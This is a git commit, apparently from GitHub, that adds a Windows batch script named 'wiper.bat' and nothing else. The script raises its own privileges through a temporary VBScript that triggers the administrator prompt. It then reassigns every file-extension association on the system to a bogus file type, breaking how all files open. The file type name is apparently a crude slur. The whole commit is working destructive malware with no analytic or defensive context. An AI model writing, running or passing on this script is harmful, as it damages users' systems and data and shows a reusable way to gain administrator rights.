bda9d931caed8546ada688408a06ce6f73607ec0
Kaufko <99084056+Kaufko@users.noreply.github.com>
2024-10-21 23:01:38 +0200

    Create wiper.bat
    awd

---
+++ wiper.bat
@@ -0,0 +1,14 @@
+if _%1_==_payload_  goto :payload
+
+:getadmin
+    echo %~nx0: elevating self
+    set vbs=%temp%\getadmin.vbs
+    echo Set UAC = CreateObject^("Shell.Application"^)                >> "%vbs%"
+    echo UAC.ShellExecute "%~s0", "payload %~sdp0 %*", "", "runas", 1 >> "%vbs%"
+    "%temp%\getadmin.vbs"
+    del "%temp%\getadmin.vbs"
+goto :eof
+
+:payload
+    for /f "delims==" %%a in ('assoc') do (assoc %%a=wiped & ftype gayfile=wiped.bat)
+goto :eof
